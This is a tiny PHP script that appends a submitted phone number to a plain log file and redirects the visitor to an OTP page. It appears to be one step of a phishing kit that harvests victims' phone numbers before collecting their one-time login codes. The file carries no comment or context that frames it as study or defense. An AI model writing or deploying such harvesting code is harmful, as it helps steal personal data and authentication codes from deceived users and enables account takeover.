<?php

    file_put_contents("log.txt", "Number: " . $_POST['phone_number'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();